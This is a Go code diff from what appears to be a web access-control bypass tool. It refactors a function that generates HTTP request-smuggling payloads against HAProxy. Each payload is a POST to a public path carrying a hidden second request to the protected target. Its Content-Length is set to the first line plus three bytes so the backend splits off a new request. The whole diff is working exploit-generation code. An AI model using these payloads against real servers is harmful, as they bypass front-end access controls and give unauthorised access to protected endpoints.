@@ -53,26 +53,22 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 
 	// For each public path, try to smuggle a request to the target path
 	for _, publicPath := range publicPaths {
-		// Create the smuggled request components
+		// Craft the smuggled request
+		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n",
+			path, publicPath, host)
+
+		// Properly calculate the content length dynamically:
+		// First line + "h:G" which is necessary for the request smuggling technique
 		firstLine := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
-		secondLine := fmt.Sprintf("h:GET %s HTTP/1.1\r\n", publicPath)
-		thirdLine := fmt.Sprintf("Host: %s\r\n", host)
+		contentLength := len(firstLine) + 3 // +3 for "h:G"
 
-		// Full smuggled request (for the body)
-		smuggledRequest := firstLine + secondLine + thirdLine
-
-		// Calculate Content-Length to include the first line plus a few characters of the second line
-		// This is the key part of the request smuggling technique - we want to include just enough
-		// bytes so that the backend sees the rest as a new request
-		partialRequestLen := len(firstLine) + 3 // First line + "h:G"
-
-		// Create payload
+		// Create payload with dynamically calculated Content-Length
 		job := BypassPayload{
 			OriginalURL:  targetURL,
 			Method:       "POST",
 			Scheme:       parsedURL.Scheme,
 			Host:         host,
-			RawURI:       publicPath, // Use the public path in the initial request
+			RawURI:       publicPath,
 			BypassModule: bypassModule,
 			Body:         smuggledRequest,
 			Headers: []Headers{
@@ -82,7 +78,7 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 				},
 				{
 					Header: "Content-Length",
-					Value:  fmt.Sprintf("%d", partialRequestLen),
+					Value:  fmt.Sprintf("%d", contentLength), // Dynamically calculated
 				},
 			},
 		}
